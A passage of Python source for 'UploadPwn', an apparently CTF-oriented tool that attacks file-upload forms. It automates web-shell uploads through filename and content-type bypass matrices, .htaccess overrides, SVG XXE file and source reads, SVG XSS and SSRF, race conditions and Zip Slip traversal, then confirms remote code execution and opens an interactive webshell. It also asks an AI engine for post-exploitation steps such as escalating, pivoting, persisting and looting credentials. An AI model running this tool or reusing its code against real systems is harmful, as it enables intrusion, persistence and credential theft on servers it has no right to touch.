                    url = f"{self.sm.target}{d}{fn}?{param}={cmd}"
                    try:
                        r = self.sm.session.get(url, timeout=8)
                        if r.status_code == 200 and r.text.strip():
                            if any(x in r.text for x in
                                   ["uid=","root","www-data","GIF89a",
                                    "/bin","/usr","daemon"]):
                                return True, url, param, r.text.strip()
                    except: pass
        return False, "", self.cmd_param, ""

    def launch_shell(self, filename, url, param, output, shell, ct):
        pwn("RCE CONFIRMED!")
        print(f"""
{G}{BOLD}╔══════════════════════════════════════════════════════╗
║  ✓  SHELL IS LIVE                                    ║
╠══════════════════════════════════════════════════════╣
║  File   : {filename[:50]:<50}║
║  URL    : {url[:50]:<50}║
║  Param  : {param:<50}║
║  Shell  : {shell:<50}║
╚══════════════════════════════════════════════════════╝{W}""")
        print(f"  Output: {output[:200]}\n")
        if self.d: self.d.record_rce(filename, url, output, shell, ct)

        # Read flag automatically
        flag_out = self.run_cmd(url, param, f"cat {self.flag_path}")
        if flag_out and len(flag_out) < 200:
            print(f"\n{Y}{BOLD}[FLAG] {flag_out}{W}\n")
            if self.d: self.d.record_flag(flag_out)

        # AI post-exploitation guidance
        if self.ai:
            ai("Generating post-exploitation guidance...")
            ctx  = self.d.to_scan_context() if self.d else {}
            ctx["shell_url"]      = url
            ctx["rce_confirmed"]  = True
            ctx["initial_output"] = output
            resp = self.ai.analyze(ctx,
                "RCE is confirmed. Give me post-exploitation steps "
                "appropriate for CTF (find flag) and real engagement "
                "(escalate, pivot, persist, loot credentials).")
            self.ai.print_ai_response(resp)

        if self.interactive:
            ws = WebShell(self.sm.session, url, param, self.d, self.ai)
            ws.interactive(filename, shell, ct)
        else:
            info(f"Tip: Rerun with --interactive to get a full shell")
            info(f"     curl '{url}?{param}=<your_command>'")

    def run_cmd(self, shell_url, param, cmd):
        try:
            r = self.sm.session.get(
                f"{shell_url}?{param}={quote(cmd)}", timeout=10)
            if r.status_code == 200:
                out = r.text.strip()
                return out[6:].lstrip(";\n") if out.startswith("GIF89a") else out
        except: pass
        return None

    # ── Main bypass matrix ────────────────────────────────────────────────────
    def attack_matrix(self):
        info("MODULE: Full Bypass Matrix")
        filenames = gen_all_filenames()
        info(f"{len(filenames)} filenames × {len(ALL_SHELLS)} shells "
             f"× {len(CT_IMAGE+CT_MISC)} content-types")

        for fname in filenames:
            for (fn, content, ct, sname) in build_matrix(fname):
                s, b, _ = self.upload(fn, content, ct)
                if not self.is_success(s, b):
                    if self.verbose: print(f"  {DIM}✗ {fn[:35]} [{sname}]{W}")
                    continue
                ok(f"UPLOADED: {fn} | {sname} | {ct}")
                rce_ok, url, param, out = self.verify_rce(fn)
                if rce_ok:
                    self.launch_shell(fn, url, param, out, sname, ct)
                    return fn, url
        fail("Matrix complete — no RCE.")
        if self.d and self.ai:
            ai("Asking AI to diagnose failure...")
            resp = self.ai.diagnose_failure(
                self.d.to_scan_context(),
                "Full bypass matrix failed — all filename/shell/content-type combos rejected")
            self.ai.print_ai_response(resp)
        return None, None

    # ── .htaccess ─────────────────────────────────────────────────────────────
    def attack_htaccess(self):
        info("MODULE: .htaccess")
        for i, payload in enumerate(HTACCESS_PAYLOADS):
            s,b,_ = self.upload(".htaccess", payload, "text/plain")
            if self.is_success(s, b):
                ok(f".htaccess variant {i+1} uploaded!")
                if self.d: self.d.filter_bypassed("Extension Whitelist",
                    ".htaccess → any ext executes PHP")
                for sname, sbytes in SHELLS.items():
                    s2,b2,_ = self.upload("shell.jpg", sbytes, "image/jpeg")
                    if self.is_success(s2, b2):
                        rce_ok, url, param, out = self.verify_rce("shell.jpg")
                        if rce_ok:
                            self.launch_shell("shell.jpg",url,param,out,sname,"image/jpeg")
                            return "shell.jpg", url
        fail(".htaccess rejected.")
        return None, None

    # ── SVG XXE read ──────────────────────────────────────────────────────────
    def attack_svg_xxe_read(self, filepath):
        info(f"MODULE: SVG XXE → {filepath}")
        s,b,_ = self.upload("xxe.svg", SVG_XXE_FILE(filepath), "image/svg+xml")
        if not self.is_success(s, b): fail("SVG rejected"); return None
        for d in self.shell_dirs:
            url = f"{self.sm.target}{d}xxe.svg"
            try:
                r = self.sm.session.get(url, timeout=8)
                if r.status_code == 200 and len(r.text.strip()) > 5:
                    ok(f"XXE success!")
                    content = r.text.strip()
                    print(f"\n{G}--- {filepath} ---{W}\n{content[:1000]}")
                    if self.d: self.d.record_xxe(filepath, content)
                    if "HTB{" in content and self.d: self.d.record_flag(content)
                    return content
            except: pass
        return None

    # ── SVG XXE source ────────────────────────────────────────────────────────
    def attack_svg_xxe_source(self, php_file):
        info(f"MODULE: SVG XXE Source → {php_file}")
        s,b,_ = self.upload("xxe_src.svg", SVG_XXE_B64(php_file), "image/svg+xml")
        if not self.is_success(s, b): return None
        for d in self.shell_dirs:
            url = f"{self.sm.target}{d}xxe_src.svg"
            try:
                r = self.sm.session.get(url, timeout=8)
                if r.status_code == 200 and r.text.strip():
                    try:
                        decoded = base64.b64decode(
                            r.text.strip().encode()).decode(errors="replace")
                        ok(f"Source decoded: {php_file}")
                        print(f"\n{G}--- {php_file} ---{W}\n{decoded[:2000]}")
                        if self.d: self.d.record_source(php_file, decoded)
                        # Auto-expand shell dirs from source
                        for m in re.finditer(r"['\"]([./]*\w+/\w*)['\"]", decoded):
                            c = m.group(1)
                            if any(x in c.lower() for x in
                                   ["upload","image","file","media","avatar"]):
                                p = "/"+c.lstrip("./")
                                if p not in self.shell_dirs:
                                    self.shell_dirs.append(p)
                                    ok(f"Upload dir from source: {p}")
                        return decoded
                    except: pass
            except: pass
        return None

    # ── Race condition ────────────────────────────────────────────────────────
    def attack_race(self):
        info("MODULE: Race Condition")
        found=[False]; result=[None]
        fn="shell.php"; ct="image/gif"; content=SHELLS["gif_magic"]

        def uploader():
            for _ in range(100):
                self.upload(fn, content, ct)
                if found[0]: break
                time.sleep(0.01)

        def accessor():
            for _ in range(300):
                rce_ok, url, param, out = self.verify_rce(fn)
                if rce_ok:
                    found[0]=True; result[0]=(url,param,out); break
                time.sleep(0.03)

        t1=threading.Thread(target=uploader,daemon=True)
        t2=threading.Thread(target=accessor,daemon=True)
        t1.start(); t2.start(); t1.join(); t2.join()

        if result[0]:
            url,param,out = result[0]
            self.launch_shell(fn,url,param,out,"gif_magic",ct)
            if self.d: self.d.filter_bypassed("Validate-then-Delete","race condition")
            return fn, url
        fail("Race failed.")
        return None, None

    # ── Zip Slip ──────────────────────────────────────────────────────────────
    def attack_zip_slip(self):
        info("MODULE: Zip Slip")
        try:
            import zipfile, io
            buf = io.BytesIO()
            with zipfile.ZipFile(buf,"w") as zf:
                zf.writestr("../../../var/www/html/shell.php",
                            SHELLS["standard"].decode())
                zf.writestr("shell.php", SHELLS["standard"].decode())
            buf.seek(0)
            s,b,_ = self.upload("evil.zip", buf.read(), "application/zip")
            if self.is_success(s, b):
                rce_ok, url, param, out = self.verify_rce("shell.php")
                if rce_ok:
                    self.launch_shell("shell.php",url,param,out,"zip_slip","application/zip")
                    return "shell.php", url
        except Exception as e:
            fail(f"Zip slip: {e}")
        return None, None

    # ── Discover ──────────────────────────────────────────────────────────────
    def discover_all(self, page_url=None):
        info("MODULE: Discovery")
        if BS4_OK:
            url = page_url or self.sm.target
            try:
                r    = self.sm.session.get(url, timeout=10)
                soup = BeautifulSoup(r.text,"html.parser")
                for form in soup.find_all("form"):
                    for fi in form.find_all("input",{"type":"file"}):
                        fname = fi.get("name","?")
                        ok(f"Upload field: '{fname}' → use --field {fname}")
                        action = form.get("action")
                        if action: ok(f"Upload action: {urljoin(url,action)}")
                        if self.d: self.d.log("form_discover","found",
                                               f"Field: {fname}")
            except Exception as e:
                fail(f"Form discovery: {e}")

        for d in DEFAULT_SHELL_DIRS:
            url = f"{self.sm.target}{d}"
            try:
                r = self.sm.session.get(url, timeout=5)
                if r.status_code in [200,403]:
                    ok(f"Dir ({r.status_code}): {url}")
                    if d not in self.shell_dirs:
                        self.shell_dirs.append(d)
            except: pass


# ═══════════════════════════════════════════════════════════════════════════════
# AI CHAT MODE
# ═══════════════════════════════════════════════════════════════════════════════

def ai_chat_mode(ai_engine: AIEngine, disc: Discovery):
    """
    Drop into an AI chat session for manual guidance.
    Use when the automated modules haven't cracked it yet.
    """
    print(f"""
{C}{BOLD}╔══════════════════════════════════════════════════════════════╗
║              AI GUIDANCE MODE                                ║
║  Ask anything about the target, what to try next,           ║
║  how a technique works, or how to interpret an error.        ║
║  Type 'exit' to return to the tool.                          ║
╚══════════════════════════════════════════════════════════════╝{W}
""")
    # Send current context as first message
    ctx  = disc.to_scan_context() if disc else {}
    resp = ai_engine.analyze(ctx,
        "I'm stuck. Analyze my scan results and give me the "
        "most likely path to RCE. Be specific and decisive.")
    ai_engine.print_ai_response(resp)

    while True:
        try:
            q = input(f"{C}{BOLD}ai>{W} ").strip()
        except (KeyboardInterrupt, EOFError):
            print(); break
        if q.lower() in ["exit","quit","q"]: break
        if not q: continue
        resp = ai_engine.ask(q)
        ai_engine.print_ai_response(resp)


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    print(BANNER)

    ap = argparse.ArgumentParser(
        description="UploadPwn v5.0 — AI-Powered File Upload Attack Tool",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
═══ QUICK START ════════════════════════════════════════════════════════
  # No login, auto-detect everything, AI guidance
  python3 uploadpwn.py -t http://IP:PORT

  # With login (CSRF auto-handled, fields auto-detected)
  python3 uploadpwn.py -t http://IP:PORT \\
    --login /login.php --user admin --pass admin

  # Login → navigate to sub-page where upload is
  python3 uploadpwn.py -t http://IP:PORT \\
    --login /login.php --user admin --pass admin \\
    --nav /dashboard --upload-page /settings/avatar \\
    --field profile_pic

  # Browser login (JS-heavy pages)
  python3 uploadpwn.py -t http://IP:PORT \\
    --login /login.php --user admin --pass admin \\
    --login-method selenium

  # Already have a session cookie
  python3 uploadpwn.py -t http://IP:PORT \\
    --cookie "PHPSESSID=abc123"

  # Interactive webshell after RCE
  python3 uploadpwn.py -t http://IP:PORT --interactive

  # SVG XXE — read flag directly (HTB Section 8 fastest path)
  python3 uploadpwn.py -t http://IP:PORT --svg-read /flag.txt

  # Read PHP source to find hidden upload dir
  python3 uploadpwn.py -t http://IP:PORT --svg-src upload.php

  # AI guidance mode (stuck? ask AI what to try next)
  python3 uploadpwn.py -t http://IP:PORT --ai-chat

  # Run EVERYTHING
  python3 uploadpwn.py -t http://IP:PORT --all --interactive
════════════════════════════════════════════════════════════════════════
        """
    )

    # Target
    ap.add_argument("-t","--target",       required=True)
    ap.add_argument("-e","--endpoint",     default=None,
                    help="Upload endpoint (auto-detected if omitted)")
    ap.add_argument("--shell-dirs",        nargs="+", default=DEFAULT_SHELL_DIRS)
    ap.add_argument("--field",             default=None,
                    help="Upload field name (auto-detected if omitted)")
    ap.add_argument("--cmd-param",         default="cmd")
    ap.add_argument("--flag",              default="/flag.txt")

    # Auth
    ap.add_argument("--login",             help="Login page path e.g. /login.php")
    ap.add_argument("--user",              help="Username")
    ap.add_argument("--pass",              dest="password")
    ap.add_argument("--user-field",        default="username")
    ap.add_argument("--pass-field",        default="password")
    ap.add_argument("--login-method",      default="auto",
                    choices=["auto","requests","selenium"])
    ap.add_argument("--nav",              dest="nav_url",
                    help="Page to navigate to after login e.g. /dashboard")
    ap.add_argument("--upload-page",       dest="upload_page",
                    help="Page where upload form lives e.g. /profile/settings")
    ap.add_argument("--cookie",            action="append", dest="cookies",
                    metavar="NAME=VALUE")
    ap.add_argument("--header",            action="append", dest="headers",
                    metavar="Name: Value")

    # Modules
    ap.add_argument("--all",               action="store_true")
    ap.add_argument("--matrix",            action="store_true")
    ap.add_argument("--htaccess",          action="store_true")
    ap.add_argument("--svg-read",          metavar="PATH")
    ap.add_argument("--svg-src",           metavar="FILE")
    ap.add_argument("--svg-xss",           action="store_true")
    ap.add_argument("--svg-ssrf",          metavar="URL")
    ap.add_argument("--race",              action="store_true")
    ap.add_argument("--zip",               action="store_true")
    ap.add_argument("--dos",               action="store_true")
    ap.add_argument("--discover",          action="store_true")
    ap.add_argument("--no-probe",          action="store_true")

    # AI
    ap.add_argument("--ai",               action="store_true",
                    help="Enable AI analysis at each stage")
    ap.add_argument("--ai-chat",           action="store_true",
                    help="Drop into AI chat mode for manual guidance")
    ap.add_argument("--no-ai",             action="store_true",
                    help="Disable AI completely")

    # Output
    ap.add_argument("--interactive",       action="store_true",
                    help="Interactive webshell on RCE")
    ap.add_argument("-v","--verbose",      action="store_true")
    ap.add_argument("-o","--output",       default="uploadpwn_report.json")

    args = ap.parse_args()

    target = args.target.rstrip("/")
    creds  = {"username": args.user, "password": args.password} \
             if args.user and args.password else None

    # AI engine
    use_ai    = (args.ai or args.ai_chat) and not args.no_ai
    ai_engine = AIEngine(enabled=use_ai)

    d = Discovery(target, args.output)

    sm = SessionManager(
        target        = target,
        login_url     = (target + args.login)       if args.login       else None,
        creds         = creds,
        nav_url       = (target + args.nav_url)      if args.nav_url     else None,
        upload_page   = (target + args.upload_page)  if args.upload_page else None,
        user_field    = args.user_field,
        pass_field    = args.pass_field,
        extra_headers = args.headers,
        extra_cookies = args.cookies,
        disc          = d,
    )

    # Login
    if args.login and creds:
        sm.login(method=args.login_method)
        sm.navigate_to_upload_page()
    elif args.cookies or args.headers:
        info("Using provided cookie/header")
    else:
        info("No login — unauthenticated")

    # Server fingerprint
    server_info = sm.detect_server(target)

    # Auto-detect endpoint + field
    upload_endpoint = args.endpoint
    upload_field    = args.field

    if not upload_endpoint:
        ep = sm.find_upload_endpoint()
        upload_endpoint = ep or "/upload.php"
        if not ep: warn(f"Endpoint not detected — using {upload_endpoint}")

    if not upload_field:
        fld = sm.find_upload_field()
        upload_field = fld or "uploadFile"
        if not fld: warn(f"Field not detected — using {upload_field}")

    upload_url = (target + upload_endpoint
                  if not upload_endpoint.startswith("http")
                  else upload_endpoint)

    atk = UploadAttacker(
        sm          = sm,
        upload_url  = upload_url,
        shell_dirs  = list(args.shell_dirs),
        cmd_param   = args.cmd_param,
        field       = upload_field,
        flag_path   = args.flag,
        verbose     = args.verbose,
        disc        = d,
        ai_engine   = ai_engine,
        interactive = args.interactive,
    )

    print(f"\n{B}  Target        : {target}")
    print(f"  Upload URL    : {upload_url}")
    print(f"  Upload field  : {upload_field}")
    print(f"  Flag          : {args.flag}")
    print(f"  AI            : {'enabled' if use_ai else 'disabled (use --ai to enable)'}")
    print(f"  Report        : {args.output}{W}\n")

    # AI initial analysis
    if use_ai and not args.ai_chat:
        ai("Running initial AI analysis...")
        ctx = d.to_scan_context()
        ctx["server_info"]     = server_info
        ctx["upload_url"]      = upload_url
        ctx["upload_field"]    = upload_field
        resp = ai_engine.analyze(ctx,
            "Analyze the target and server fingerprint. "
            "What is the most likely attack vector? "
            "What should I try first?")
        ai_engine.print_ai_response(resp)

    # Filter probe
    if not args.no_probe:
        probe = FilterProbe(atk.upload, d, upload_field)
        probe.probe_all()
        # AI after probe
        if use_ai:
            ai("AI analyzing probe results...")
            resp = ai_engine.analyze(d.to_scan_context(),
                "Filter fingerprinting is complete. "
                "Based on the detected filters, give me the exact "
                "ordered attack plan — most likely to succeed first.")
            ai_engine.print_ai_response(resp)

    run_all = args.all

    if args.discover or run_all:
        atk.discover_all(sm.upload_page)

    if args.svg_read or run_all:
        atk.attack_svg_xxe_read(args.svg_read or args.flag)
        if d.rce or d.flags: d.print_report(); d.save(); sys.exit(0)

    if args.svg_src or run_all:
        atk.attack_svg_xxe_source(args.svg_src or "upload.php")

    if args.svg_xss or run_all:
        s,b,_ = atk.upload("xss.svg", SVG_XSS, "image/svg+xml")
        if atk.is_success(s,b): ok("SVG XSS uploaded")

    if args.svg_ssrf or run_all:
        url = args.svg_ssrf or "http://127.0.0.1/"
        s,b,_ = atk.upload("ssrf.svg", SVG_SSRF(url), "image/svg+xml")
        if atk.is_success(s,b): ok(f"SVG SSRF uploaded → {url}")

    if args.htaccess or run_all:
        fn, url = atk.attack_htaccess()
        if url: d.print_report(); d.save(); sys.exit(0)

    if args.zip or run_all:
        fn, url = atk.attack_zip_slip()
        if url: d.print_report(); d.save(); sys.exit(0)

    if args.race or run_all:
        fn, url = atk.attack_race()
        if url: d.print_report(); d.save(); sys.exit(0)

    # Main matrix
    if not d.rce:
        if args.matrix or run_all or not any([
            args.htaccess, args.svg_read, args.svg_src,
            args.svg_xss, args.svg_ssrf, args.race, args.zip,
            args.dos, args.discover
        ]):
            fn, url = atk.attack_matrix()
            if url: d.print_report(); d.save(); sys.exit(0)

    # AI chat mode (if stuck or explicitly requested)
    if args.ai_chat or (use_ai and not d.rce):
        ai_chat_mode(ai_engine, d)

    d.print_report()
    d.save()


if __name__ == "__main__":
    main()
